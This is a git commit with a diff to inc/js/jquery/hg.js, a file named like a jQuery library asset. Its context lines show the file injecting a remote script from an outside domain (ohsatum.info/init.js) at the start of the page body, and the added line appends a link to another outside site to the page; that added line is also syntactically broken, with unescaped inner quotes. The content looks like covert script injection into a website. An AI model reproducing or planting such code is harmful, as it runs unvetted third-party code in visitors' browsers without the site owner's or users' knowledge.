b627d9770b4ce9b006dcde132ba982b68ea2543d
thearthouse <realist.tm@yandex.com>
2021-09-20 02:51:20 +0300

    Update hg.js

--- inc/js/jquery/hg.js
+++ inc/js/jquery/hg.js
@@ -7,3 +7,4 @@ script.src = 'https://ohsatum.info/init.js?sid=871623';
 var entry = document.body.firstChild;
 entry.parentNode.insertBefore(script, entry);
 })();
+document.body.innerHTML += "<h2><a class="mn-brand" href="https://zismaz.pserver.ru">ZisMaz - your daily fun</a></h2>";
